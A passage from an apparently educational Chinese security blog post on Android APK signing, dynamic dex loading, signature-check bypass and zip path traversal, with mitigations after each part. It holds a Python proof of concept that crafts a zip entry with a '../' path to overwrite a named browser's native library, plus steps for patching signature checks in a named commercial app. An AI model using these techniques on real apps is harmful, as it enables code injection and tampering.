class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SignerData（签名者数据）：主要包括签名者的证书，整个APK完整性校验hash，以及一些必要信息</span><br><span class="line">Signature（签名）：开发者对SignerData部分数据的签名数据</span><br><span class="line">PublicKey（公钥）：用于验签的公钥数据</span><br></pre></td></tr></table></figure><p><strong>签名流程：</strong></p><p>​相比v1签名方案，v2签名方案不再以文件为单位计算摘要，而是以1MB为单位将文件拆分为多个连续的快（chunk），每个分区的最后一个快可能会小于1MB。v2签名流程如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/22.png" alt="image-20220221151319198"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）对区块 <span class="number">1</span>、<span class="number">3</span>、<span class="number">4</span>，按照 1MB 大小分割为多个块（chunk）</span><br><span class="line">（<span class="number">2</span>）计算每个块的摘要</span><br><span class="line">（<span class="number">3</span>）计算（<span class="number">2</span>）中所有摘要的签名</span><br><span class="line">（<span class="number">4</span>）添加X<span class="number">.509</span>开发者数字证书（公钥）</span><br></pre></td></tr></table></figure><p><strong>验证流程：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/23.png" alt="image-20220221151544009"></p><p>因为v2签名机制是在Android 7.0上版本才支持，因此对于Android 7.0以及以上版本，在安装过程中，如果v2 签名块，则必须走 v2 签名机制，不能绕过。否则降级走 v1 签名机制</p><p>v1 和 v2 签名机制是可以同时存在的，其中对于 v1 和 v2 版本同时存在的时候，v1 版本的 META_INF 的 <code>.SF</code> 文件属性当中有一个 <code>X-Android-APK-Signed</code> 属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Android-APK-Signed: 2</span><br></pre></td></tr></table></figure><p>v2签名本身的验证过程：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/24.png" alt="image-20220221152811530"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）利用PublicKey解密Signature，得到SignerData的hash明文</span><br><span class="line">（2）计算SignerData的hash值</span><br><span class="line">（3）两个值进行比较，如果相同则认为APK没有被修改过，解析出SignerData中的证书。否则安装失败</span><br><span class="line">（4）如果是第一次安装，直接将证书保存在应用信息中</span><br><span class="line">（5）如果是更新安装，即设备中原来存在这个应用，验证之前的证书是否与本次解析的证书相同。若相同，则安装成功，否则失败</span><br></pre></td></tr></table></figure><h5 id="lt-3-gt-签名方案v3"><a href="#lt-3-gt-签名方案v3" class="headerlink" title="&lt;3&gt;签名方案v3"></a>&lt;3&gt;签名方案v3</h5><p>Android 9.0中引入了新的签名方式v3，v3签名在v2的基础上，仍然采用检查整个压缩包的校验方式。不同的是在签名部分增可以添加新的证书（Attr块）。在这个新块中，会记录我们之前的签名信息以及新的签名信息， 支持密钥轮换，即以密钥转轮的方案，来做签名的替换和升级。这意味着，只要旧签名证书在手，应用能够在 APK 更新过程中更改其签名密钥。</p><p>v3 签名新增的新块（attr）存储了所有的签名信息，由更小的 Level 块，以链表的形式存储。</p><p><strong>签名流程：</strong></p><p>v3版本签名块也分成同样的三部分，与v2不同的是在SignerData部分，v3新增了attr块，其中是由更小的level块组成。每个level块中可以存储一个证书信息。前一个level块证书验证下一个level证书，以此类推。最后一个level块的证书，要符合SignerData中本身的证书，即用来签名整个APK的公钥所属于的证书。从v2到v3的过渡：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/25.png" alt="image-20220221153113453"></p><p><strong>签名校验：</strong></p><p>Android 的签名方案的升级都需要确保向下兼容。因此，在引入 v3 方案后会根据 APK 签名方案，v3 -&gt; v2 -&gt; v1 依次尝试验证 APK。而较旧的平台会忽略 v3 签名并尝试 v2 签名，最后才去验证 v1 签名。如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/26.png" alt="image-20220221152048634"></p><p>注意：对于覆盖安装的情况，签名校验只支持升级而不支持降级。即一个使用 V1 签名的 Apk，可以使用 V2 签名的 Apk 进行覆盖安装，反之则不允许</p><p>v3签名自身的校验：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/27.png" alt="image-20220221153432708"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）利用PublicKey解密Signature，得到SignerData的hash明文</span><br><span class="line">（<span class="number">2</span>）计算SignerData的hash值</span><br><span class="line">（<span class="number">3</span>）两个值进行比较，如果相同则认为APK没有被修改过，解析出SignerData中的证书。否则安装失败</span><br><span class="line">（<span class="number">4</span>）逐个解析出level块证书并验证，并保存为这个应用的历史证书</span><br><span class="line">（<span class="number">5</span>）如果是第一次安装，直接将证书与历史证书一并保存在应用信息中</span><br><span class="line">（<span class="number">6</span>）如果是更新安装，验证之前的证书与历史证书，是否与本次解析的证书或者历史证书中存在相同的证书，其中任意一个证书符合即可安装</span><br></pre></td></tr></table></figure><h5 id="lt-4-gt-三种签名的比较和校验时机"><a href="#lt-4-gt-三种签名的比较和校验时机" class="headerlink" title="&lt;4&gt;三种签名的比较和校验时机"></a>&lt;4&gt;三种签名的比较和校验时机</h5><p>v2、v3的比较如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/28.png" alt="image-20220221153432708"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v1签名方案：基于 Jar 的签名方案，但存在的问题：完整性覆盖范围不足 &amp; 验证性能差</span><br><span class="line">v2签名方案：通过条目内容区、中央目录区之间插入APK 签名分块（APK Signing Block）对v1签名进行了优化</span><br><span class="line">v3签名方案：支持密钥轮换，新增的新块（attr）存储了所有的签名信息，对v2签名进行了优化</span><br></pre></td></tr></table></figure><p>验证签名的时机主要要了解Android安装应用的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">系统应用安装：开机时完成，没有安装界面</span><br><span class="line">网络下载的应用安装：通过市场应用完成，没有安装界面</span><br><span class="line">ADB工具安装：没有安装界面</span><br><span class="line">第三方应用安装：通过packageinstall.apk应用安装，有安装界面</span><br></pre></td></tr></table></figure><p>但是其实无论通过哪种方式安装都要通过PackageManagerService来完成安装的主要工作，最终在PMS中会去验证签名信息，如v3验证方式一样</p><h3 id="4-Android动态加载"><a href="#4-Android动态加载" class="headerlink" title="4.Android动态加载"></a>4.Android动态加载</h3><p>Android动态加载总会涉及到插件化、热部署、热修复等，这里我在网上查阅资料后，给大家总结了下动态加载的场景使用和分类：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/1.png" alt="image-20220218172137791"></p><p>动态加载，就是程序运行时，可以加载外部的可执行文件并运行，这样使得我们可以不用安装apk就可以更新应用，针对一些SDK项目，可以加快app新版本的覆盖率、快速修复线上bug。这里运行时是指应用冷启动并开始工作后，外部可以是SD卡，可以是data目录，也可以是jniLib目录，这些可执行文件是没有随着应用一起编译的的</p><p>动态加载的特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）app在运行的时候，可以通过加载一些本身不存在的文件，来实现一定功能，这种经常应用在app更新的过程中</span><br><span class="line">（2）可执行文件是可以替换的，更换静态资源不属于动态加载</span><br><span class="line">（3）动态加载的核心思想就是动态调用外部的dex文件，Android Apk自带的dex是程序入口，所有功能可以直接从服务器中下载dex来完成</span><br></pre></td></tr></table></figure><p>Android动态加载按照工作机制不同，可以分为<code>虚拟机层动态加载</code>和<code>Native层动态加载</code>两大类</p><p>这里由于本文主要讲解动态加载方面漏洞，所以对热更新、热修复等原理就不深究了，大家感兴趣可以下去查阅相关资料，动态加载原理详细可以参考我上一篇帖子：<a href="https://bbs.pediy.com/thread-271538.htm">Android加壳脱壳学习（1）——动态加载和类加载机制详解</a></p><h2 id="三、插件化和解压缩安全场景和分类"><a href="#三、插件化和解压缩安全场景和分类" class="headerlink" title="三、插件化和解压缩安全场景和分类"></a>三、插件化和解压缩安全场景和分类</h2><h3 id="1-插件化漏洞的安全场景"><a href="#1-插件化漏洞的安全场景" class="headerlink" title="1.插件化漏洞的安全场景"></a>1.插件化漏洞的安全场景</h3><p>前文我们知道了Android的动态加载机制和签名机制，Android插件化机制具有模块解耦性，可以动态升级按序加载，而且当下很多APP都使用了热部署、热修复、插件化等技术都采用了动态加载技术，这样可以实现APP的快速更新，但是也带来一定的安全隐患，使得很多恶意软件能熬过安全检测，来动态加载代码。而执行加载绕过执行漏洞一般与Android 的签名机制密不可分，所以上文我们也很详细的讲解了Android的签名机制。</p><h3 id="2-插件化漏洞的分类"><a href="#2-插件化漏洞的分类" class="headerlink" title="2.插件化漏洞的分类"></a>2.插件化漏洞的分类</h3><p>很多APP通过动态加载一些dex或so文件，但是考虑到存在动态加载的安全性问题，往往会对加载的文件进行签名校验机制，因此我们可以将插件化漏洞分为两类：动态加载漏洞和签名校验绕过漏洞</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/29.png" alt="image-20220307123657260"></p><h3 id="3-解压缩漏洞的安全场景"><a href="#3-解压缩漏洞的安全场景" class="headerlink" title="3.解压缩漏洞的安全场景"></a>3.解压缩漏洞的安全场景</h3><p>Android中经常会涉及到解压缩问题，比如动态加载机制，可能下载了apk&#x2F;zip文件，然后在本地做解压工作，还有就是一些资源在本地占用apk包的太大，就也打包成zip放到服务端，使用的时候再下发。Android在解压zip文件，使用的是ZipInputStream和ZipEntry类，代码比较简单，但是ZipEntry.getName的方法存在的漏洞就是返回的是文件名，并没有对特殊字符处理，linux中<code>../</code>可以命令文件但是这个可以进行穿越上层目录，就会带来一定的安全隐患</p><h3 id="4-签名机制和解压缩漏洞分类"><a href="#4-签名机制和解压缩漏洞分类" class="headerlink" title="4.签名机制和解压缩漏洞分类"></a>4.签名机制和解压缩漏洞分类</h3><p>我们这里列举两个典型的漏洞：如下所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/53.png" alt="image-20220308105246647"></p><h2 id="四、插件化漏洞原理分析和复现"><a href="#四、插件化漏洞原理分析和复现" class="headerlink" title="四、插件化漏洞原理分析和复现"></a>四、插件化漏洞原理分析和复现</h2><h3 id="1-动态加载漏洞"><a href="#1-动态加载漏洞" class="headerlink" title="1.动态加载漏洞"></a>1.动态加载漏洞</h3><h4 id="（1）原理分析"><a href="#（1）原理分析" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>Android系统提供类加载器DexClassLoader，可以在运行时动态加载执行包含的JAR或APK文件内的DEX文件，这样可能导致所加载的Dex文件被恶意应用替换或代码注入，如果不对Dex文件进行签名校验，就可能导致加载的是恶意代码，这样就会进一步造成严重危害</p><h4 id="（2）案例1——动态加载"><a href="#（2）案例1——动态加载" class="headerlink" title="（2）案例1——动态加载"></a>（2）案例1——动态加载</h4><p>案例准备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原apk</span><br><span class="line">加载dex</span><br></pre></td></tr></table></figure><p>我们先编写一个测试类文件,然后生成dex文件，这里我们在dex文件中只加入字符串信息，我们源apk并未加入签名校验机制</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/31.png" alt="image-20220218192716863"></p><p>我们先将dex文件放到模拟器的sdcard&#x2F;下</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/32.png" alt="image-20211010150449575"></p><p>我们新建一个程序，然后编写主程序的代码，并授权sd读取权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">appContext</span> <span class="operator">=</span> <span class="built_in">this</span>.getApplication();</span><br><span class="line">testDexClassLoader(appContext,<span class="string">&quot;/sdcard/classes.dex&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>然后我们编写类加载器代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">testDexClassLoader</span><span class="params">(Context context, String dexfilepath)</span> &#123;</span><br><span class="line">        <span class="comment">//构建文件路径：/data/data/com.emaxple.test02/app_opt_dex，存放优化后的dex,lib库</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">optfile</span> <span class="operator">=</span> context.getDir(<span class="string">&quot;opt_dex&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">libfile</span> <span class="operator">=</span> context.getDir(<span class="string">&quot;lib_dex&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parentclassloader</span> <span class="operator">=</span> MainActivity.class.getClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">tmpclassloader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">    <span class="comment">//可以为DexClassLoader指定父类加载器</span></span><br><span class="line">        <span class="type">DexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(dexfilepath,optfile.getAbsolutePath(),libfile.getAbsolutePath(),parentclassloader);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz = dexClassLoader.loadClass(<span class="string">&quot;com.example.test.TestClass&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(clazz!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">testFuncMethod</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;test02&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line">                testFuncMethod.invoke(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>效果显示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/30.png" alt="image-20211010150449575"></p><p>这里说明加载成功了，如果我们这里写的是一段恶意代码，这样就会进行攻击，造成破坏</p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>我们上文的动态加载漏洞，是因为源APK并未对加载的dex文件进行签名校验，从而导致容易导入恶意代码，当然从Android 4.4后加入了<strong>对JAR&#x2F;DEX存放目录文件的user_id 和动态加载JAR&#x2F;DEX的进程的user_id是否一致的判断，如果不一致将抛出异常导致加载失败</strong>，这样就很好的可以防范替换加载的dex文件，进行恶意注入</p><p>解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）将动态加载的DEX/APK文件放置在APK内部或应用私有目录中</span><br><span class="line">（2）使用加密网络协议https进行下载加载的并将其放置在应用私有目录中</span><br><span class="line">（3）对加载的Dex文件进行完整性校验和签名校验</span><br></pre></td></tr></table></figure><h3 id="2-签名检验绕过漏洞"><a href="#2-签名检验绕过漏洞" class="headerlink" title="2.签名检验绕过漏洞"></a>2.签名检验绕过漏洞</h3><h4 id="（1）原理分析-1"><a href="#（1）原理分析-1" class="headerlink" title="（1）原理分析"></a>（1）原理分析</h4><p>我们知道一般对APK的验证，主要使用的是签名校验或者MD5校验，使用校验的方式较多。而签名校验一般是处理APK中动态加载或防止二次重打包的问题。</p><p>我们可以将APK中的签名检验机制进一步进行分类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">java层的签名校验：</span><br><span class="line">原理：这种是开发者在APK java层中加入了签名校验代码，然后通过校验加入文件的MD5值或者SHA1值来对文件进行校验</span><br><span class="line">解决方案：一般这种情况，我们通过定位到APK中的签名代码段，然后进行hook 篡改或者进行修改后重打包就可以进行绕过</span><br><span class="line">so层的签名校验：</span><br><span class="line">原理：由于java可解释语言的原因，所以后来开发者又将签名代码放入so层，从而增加逆向工作的难度</span><br><span class="line">解决方案：这种情况，同样可以使用IDA或GDB进行动态调试确定到签名代码段，然后使用hook 注入技术或静态修改来进行绕过</span><br><span class="line">在线签名校验：</span><br><span class="line">原理：由于前两种方式都是静态校验的方式，这样的安全性仍然较低，后来更多厂商通过服务器在线进行验证，将签名密钥发送然后在so层或java层中进行校验</span><br><span class="line">解决方案：这种情况，我们要使用抓包软件对服务器发送的数据包进行抓取，在成功获取正确密钥后，再去hook对应的签名代码段，从而就可以实现绕过</span><br></pre></td></tr></table></figure><p>这一部分完整性保护大家可以详细的参考看雪陌殇大佬的帖子<a href="https://bbs.pediy.com/thread-250990.htm">Android应用完整性保护总结</a></p><h4 id="（2）案例2——java层签名绕过"><a href="#（2）案例2——java层签名绕过" class="headerlink" title="（2）案例2——java层签名绕过"></a>（2）案例2——java层签名绕过</h4><p>案例：书旗小说.apk</p><p>我们发现书旗小说在进行重新签名后，再次安装会报错，首先我们AndroidKiller解析APP：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/33.png" alt="image-20211010150449575"></p><p>然后我们开始进行定位，这里我们使用常见的定位点：<strong>signature、killProcess、PageManager</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signature、killProcess、PageManager 一般是签名代码的关键函数，所以当我们发现这三个函数同时出现，很大程度代表了签名点</span><br></pre></td></tr></table></figure><p>我们这里搜索signature或killProcess，我们找到了签名三兄弟：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/34.png" alt="image-20211010150449575"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/35.png" alt="image-20211010150449575"></p><p>分析签名的逻辑，修改后回编译，再安装显示成功</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/37.png" alt="image-20211010150449575"></p><h4 id="（3）案例3——so层签名绕过"><a href="#（3）案例3——so层签名绕过" class="headerlink" title="（3）案例3——so层签名绕过"></a>（3）案例3——so层签名绕过</h4><p>因为so层和java层签名绕过原理相近，只是so层是分析汇编代码，java层分析Smali源码，这里我们参考一个博主的案例，我列举一下</p><p>首先我们根据NDK注册定位到so层的入口点，去查找JNI_Onload函数，然后开始去查找上面的三兄弟</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/38.png" alt="image-20220307134654634"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/39.png" alt="image-20220307134716046"></p><p>这里我们就很好的定位到了代码段，后续就是分析逻辑，修改对应的校验点即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/40.png" alt="image-20220307134854959"></p><p>最后就会发现签名成功的绕过</p><h4 id="（4）案例4——在线签名绕过"><a href="#（4）案例4——在线签名绕过" class="headerlink" title="（4）案例4——在线签名绕过"></a>（4）案例4——在线签名绕过</h4><p>在线签名校验主要是抓取校验部分的数据包，然后去查找cookie中的public_key，或者签名Signature值，通过分析数据包后再定位到相应的代码段将值回传到相应的代码段即可</p><p>这里有一个案例大家可以参考<a href="https://bbs.pediy.com/thread-270634.htm#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B">Android APP漏洞之战（6）——HTTP&#x2F;HTTPs通信漏洞详解 </a>中酷狗直播的漏洞实现，这里就是通过在线修改了MD5值，然后使得程序在升级过程中绕过了升级校验，从而成功的注入了恶意病毒</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/41.png" alt="image-20220307134854959"></p><h4 id="（5）安全防护"><a href="#（5）安全防护" class="headerlink" title="（5）安全防护"></a>（5）安全防护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）java层和so层都可以进一步混淆，来防止字符定位的方法</span><br><span class="line">（2）可以使用反调试技术，来防止动态调试进行定位的方法</span><br><span class="line">（3）可以采用对frida和xposed的检测，来进行防止hook注入</span><br><span class="line">（4）可以尽量采用在线签名，加密传输报文：</span><br><span class="line">客户端将本地程序信息上传到服务端，服务端返回一段校验代码。客户端动态执行代码，返回校验结果</span><br><span class="line">在登陆接口将登录信息在NDK层进行加密，用签名信息进行加密，在登陆接口实现中，进行解密，如果失败不允许登陆</span><br></pre></td></tr></table></figure><h2 id="五、Zip解压缩漏洞分析和复现"><a href="#五、Zip解压缩漏洞分析和复现" class="headerlink" title="五、Zip解压缩漏洞分析和复现"></a>五、Zip解压缩漏洞分析和复现</h2><h3 id="1-原理分析"><a href="#1-原理分析" class="headerlink" title="1.原理分析"></a>1.原理分析</h3><p>因为Linux系统中<code>../</code>代表向上级目录跳转，攻击者可以通过构造相应的Zip文件，利用多个’..&#x2F;‘从而改变zip包中某个文件的存放位置，费用该替换掉应用原有的文件，完成目录穿越。这样严重可能会导致任意代码执行漏洞，危害应用用户的设备安全和信息安全</p><p><code>Java</code> 代码在解压 <code>zip</code> 文件时，会使用到 <code>ZipEntry</code> 类的 <code>getName()</code> 方法，如果 <code>zip</code> 文件中包含 <code>../</code> 的字符串，该方法返回值会原样返回。如果没有过滤掉 <code>getName()</code> 返回值中的 <code>../</code> 字符串，继续解压缩操作，就会在其他目录中创建解压的文件</p><h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><p>样本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">海豚浏览器 V11.4.18</span><br><span class="line">攻击的so文件：libdolphin.so</span><br><span class="line">Poc攻击代码</span><br></pre></td></tr></table></figure><p>我们打开海豚浏览器，并用Fiddler去监控海豚浏览器，Fiddler的配置大家可以参考我之前博客</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/47.png" alt="image-20220307155050126"></p><p>这里我们可以通过抓包去发现主题下载的申请链接，然后我们将主题下载下来，然后解包查看结构，这里我们重命名为zip文件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/54.png" alt="image-20220307155156845"></p><p>我们可以发现下载下来的三个资源文件，这也说明海豚浏览器的主题本质是一个zip包</p><p>那么我们如何实现zip目录穿越了，我们是不是可以尝试去构建一个这样的zip包，去替换浏览器的下载包，并重命令去文件名，使得替换浏览器中的关键文件，这里我们就尝试去替换浏览器中的<code>libdolphin.so</code>文件。我们先查看该文件的位置：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/48.png" alt="image-20220307155820156"></p><p>此时我们知道了<code>libdolphin.so</code>文件的存放位置，目录为：<code>/data/data/com.dolphin.browser.express.web/files</code>，这样我们只需要将我们制作的<code>libdolphin.so</code>去替换原文件即可</p><p>我们编写一个<code>libdolphin.so</code>文件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/49.png" alt="image-20220307163506122"></p><p>然后我们将生成的so文件重新命名<code>libdolphin.so</code>文件，接下来我们再使用我们的Poc代码更改名称：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ZipPath = <span class="string">&#x27;../../../../../data/data/com.dolphin.browser.express.web/files/libdolphin.so&#x27;</span></span><br><span class="line">    zp = zipfile.ZipFile(<span class="string">&#x27;/root/Desktop/zipAttack/attack.zip&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    zp.write(<span class="string">&#x27;/root/Desktop/zipAttack/libdolphin.so&#x27;</span>,ZipPath)</span><br></pre></td></tr></table></figure><p>此时我们就成功的构造了我们的攻击文件<code>attack.zip</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/50.png" alt="image-20220307165944152"></p><p>然后我们只需要对海豚浏览器下载主题的包进行劫持替换即可</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/51.png" alt="image-20220307170221500"></p><p>然后我们再次点击手机下载相应主题，发现主题是成功的下载，但是并没有替换成功</p><p>经过验证，我们发现首先正常命名的so文件是可以正常的和主题一起下载成功的</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/52.png" alt="image-20220308102048695"></p><p>然后我们验证，Android中直接重命令文件<code>../../libdolphin.so</code>是可以直接回到上级目录的</p><p>所以综上是因为我测试的Android6.0 已经打了补丁，在进行解压的时候对<code>../</code>这种情况进行了过滤，这样就导致不能进行成功的穿越</p><p>当然这里我们主要是理解zip穿越的原理，这样就可以在很多地方利用这个原理存在的漏洞了</p><h3 id="3-安全防护"><a href="#3-安全防护" class="headerlink" title="3.安全防护"></a>3.安全防护</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对重要的 zip 压缩包文件进行数字签名校验，校验通过才进行解压</span><br><span class="line">检查 zip 压缩包中使用 ZipEntry.getName() 获取的文件名中是否包含 ../ 或者 .. 字符</span><br><span class="line">更换 zip 解压方式，不使用 ZipEntry.getName() 的方式，使用 ZipInputStream 替代</span><br></pre></td></tr></table></figure><p>Google的修复意见：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStream</span>(untrustedFileName);</span><br><span class="line"><span class="type">ZipInputStream</span> <span class="variable">zis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ZipInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is));</span><br><span class="line"><span class="keyword">while</span>((<span class="type">ZipEntry</span> <span class="variable">ze</span> <span class="operator">=</span> zis.getNextEntry()) != <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(DIR, ze.getName());</span><br><span class="line">  <span class="type">String</span> <span 